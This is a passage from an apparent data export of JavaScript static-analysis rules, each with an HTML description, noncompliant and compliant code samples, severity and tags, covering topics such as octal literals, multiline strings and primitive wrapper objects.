                those Schwarzenegger shades)! Where was I? Oh yes, \
                you\'ve got an error and all the extraneous whitespace is \
                just gravy.  Have a nice day.';  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var myString = 'A rather long string of English text, an error message ' +
    'actually that just keeps going and going -- an error ' +
    'message to make the Energizer bunny blush (right through ' +
    'those Schwarzenegger shades)! Where was I? Oh yes, ' +
    'you\'ve got an error and all the extraneous whitespace is ' +
    'just gravy.  Have a nice day.';
</pre>",javascript:MultilineStringLiterals,js,JavaScript,"<p>Continuing a string across a linebreak is supported in most script engines, but it is not a part of ECMAScript. Additionally, the whitespace at the
beginning of each line can't be safely stripped at compile time, and any whitespace after the slash will result in tricky errors.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var myString = 'A rather long string of English text, an error message \
                actually that just keeps going and going -- an error \
                message to make the Energizer bunny blush (right through \
                those Schwarzenegger shades)! Where was I? Oh yes, \
                you\'ve got an error and all the extraneous whitespace is \
                just gravy.  Have a nice day.';  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var myString = 'A rather long string of English text, an error message ' +
    'actually that just keeps going and going -- an error ' +
    'message to make the Energizer bunny blush (right through ' +
    'those Schwarzenegger shades)! Where was I? Oh yes, ' +
    'you\'ve got an error and all the extraneous whitespace is ' +
    'just gravy.  Have a nice day.';
</pre>",Multiline string literals should not be used,[],MINOR,['bad-practice'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>While named function expressions might be useful for debugging purposes, some browsers do not support them correctly (for example Internet Explorer
8).</p>
<h2>Noncompliant Code Example</h2>
<pre>
f = function fun(){}; // Noncompliant;  named function expression
</pre>
<h2>Compliant Solution</h2>
<pre>
fun = function(){}; // Compliant; function expression
</pre>
<h2>Exceptions</h2>
<p>ECMAScript 6 generator functions are excluded from this rule. </p>
<pre>
function* f() {} // Compliant; generator function.
</pre>",javascript:NamedFunctionExpression,js,JavaScript,"<p>While named function expressions might be useful for debugging purposes, some browsers do not support them correctly (for example Internet Explorer
8).</p>
<h2>Noncompliant Code Example</h2>
<pre>
f = function fun(){}; // Noncompliant;  named function expression
</pre>
<h2>Compliant Solution</h2>
<pre>
fun = function(){}; // Compliant; function expression
</pre>
<h2>Exceptions</h2>
<p>ECMAScript 6 generator functions are excluded from this rule. </p>
<pre>
function* f() {} // Compliant; generator function.
</pre>",Named function expressions should not be used,[],MINOR,"['cross-browser', 'user-experience']",BUG
2013-06-19T07:34:52+0200,"<p>Integer literals starting with a zero are octal rather than decimal values. While using octal values is fully supported, most developers do not
have experience with them. They may not recognize octal values as such, mistaking them instead for decimal values.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var myNumber = 010;   // Noncompliant. myNumber will hold 8, not 10 - was this really expected?
</pre>
<h2>Compliant Solution</h2>
<pre>
var myNumber = 8;
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 7.1 - Octal constants (other than zero) and octal escape sequences shall not be used. </li>
  <li> MISRA C++:2008, 2-13-2 - Octal constants (other than zero) and octal escape sequences (other than ""\0"") shall not be used </li>
  <li> MISRA C:2012, 7.1 - Octal constants shall not be used </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/_QC7AQ"">CERT, DCL18-C.</a> - Do not begin integer constants with 0 when specifying a
  decimal value </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/hYClBg"">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>
</ul>",javascript:OctalNumber,js,JavaScript,"<p>Integer literals starting with a zero are octal rather than decimal values. While using octal values is fully supported, most developers do not
have experience with them. They may not recognize octal values as such, mistaking them instead for decimal values.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var myNumber = 010;   // Noncompliant. myNumber will hold 8, not 10 - was this really expected?
</pre>
<h2>Compliant Solution</h2>
<pre>
var myNumber = 8;
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 7.1 - Octal constants (other than zero) and octal escape sequences shall not be used. </li>
  <li> MISRA C++:2008, 2-13-2 - Octal constants (other than zero) and octal escape sequences (other than ""\0"") shall not be used </li>
  <li> MISRA C:2012, 7.1 - Octal constants shall not be used </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/_QC7AQ"">CERT, DCL18-C.</a> - Do not begin integer constants with 0 when specifying a
  decimal value </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/hYClBg"">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>
</ul>",Octal values should not be used,[],BLOCKER,"['cert', 'misra', 'pitfall']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
foo(); bar(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
foo();
bar();
</pre>
<h2>Exceptions</h2>
<p>Anonymous functions containing a single statement are ignored. Control flow statements with a single nested statement are ignored as well.</p>
<pre>
onEvent(function() { doSomething(); });               // Compliant
onEvent(function(p) { doSomething(); return p % 2; }); // Noncompliant

if (condition) doSomething();                         // Compliant
if (condition) { doSomething(); }                     // Compliant
</pre>",javascript:OneStatementPerLine,js,JavaScript,"<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
foo(); bar(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
foo();
bar();
</pre>
<h2>Exceptions</h2>
<p>Anonymous functions containing a single statement are ignored. Control flow statements with a single nested statement are ignored as well.</p>
<pre>
onEvent(function() { doSomething(); });               // Compliant
onEvent(function(p) { doSomething(); return p % 2; }); // Noncompliant

if (condition) doSomething();                         // Compliant
if (condition) { doSomething(); }                     // Compliant
</pre>",Statements should be on separate lines,[],MAJOR,['style'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
let x = (y / 2 + 1);   //Compliant even if those parenthesis are useless for the compiler

if (a &amp;&amp; ((x+y &gt; 0))) {  // Noncompliant
  //...
}

return ((x + 1));  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
let x = (y / 2 + 1);

if (a &amp;&amp; (x+y &gt; 0)) {
  //...
}

return (x + 1);
</pre>",javascript:Parentheses,js,JavaScript,"<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
let x = (y / 2 + 1);   //Compliant even if those parenthesis are useless for the compiler

if (a &amp;&amp; ((x+y &gt; 0))) {  // Noncompliant
  //...
}

return ((x + 1));  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
let x = (y / 2 + 1);

if (a &amp;&amp; (x+y &gt; 0)) {
  //...
}

return (x + 1);
</pre>",Redundant pairs of parentheses should be removed,[],MAJOR,['confusing'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>When the JavaScript parser fails, it is possible to record the failure as a violation on the file. This way, not only it is possible to track the
number of files that do not parse but also to easily find out why they do not parse.</p>",javascript:ParsingError,js,JavaScript,"<p>When the JavaScript parser fails, it is possible to record the failure as a violation on the file. This way, not only it is possible to track the
number of files that do not parse but also to easily find out why they do not parse.</p>",JavaScript parser failure,[],MAJOR,['suspicious'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The use of wrapper objects for primitive types is gratuitous, confusing and dangerous. If you use a wrapper object constructor for type conversion,
just remove the <code>new</code> keyword, and you'll get a primitive value automatically. If you use a wrapper object as a way to add properties to a
primitive, you should re-think the design. Such uses are considered bad practice, and should be refactored.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let x = new Number(""0"");
if (x) {
  alert('hi');  // Shows 'hi'.
}
</pre>
<h2>Compliant Solution</h2>
<pre>
let x = Number(""0"");
if (x) {
  alert('hi');
}
</pre>
<h2>Exceptions</h2>
<p>Cases when argument of primitive type constructor is a literal of the same type are ignored, except <code>new Boolean(false)</code>.</p>
<pre>
let booleanObject = new Boolean(true);
let numberObject = new Number(0);
let stringObject = new String('');
</pre>",javascript:PrimitiveWrappers,js,JavaScript,"<p>The use of wrapper objects for primitive types is gratuitous, confusing and dangerous. If you use a wrapper object constructor for type conversion,
just remove the <code>new</code> keyword, and you'll get a primitive value automatically. If you use a wrapper object as a way to add properties to a
primitive, you should re-think the design. Such uses are considered bad practice, and should be refactored.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let x = new Number(""0"");
if (x) {
  alert('hi');  // Shows 'hi'.
}
</pre>
<h2>Compliant Solution</h2>
<pre>
let x = Number(""0"");
if (x) {
  alert('hi');
}
</pre>
<h2>Exceptions</h2>
<p>Cases when argument of primitive type constructor is a literal of the same type are ignored, except <code>new Boolean(false)</code>.</p>
<pre>
let booleanObject = new Boolean(true);
let numberObject = new Number(0);
let stringObject = new String('');
</pre>",Wrapper objects should not be used for primitive types,[],MINOR,['pitfall'],CODE_SMELL
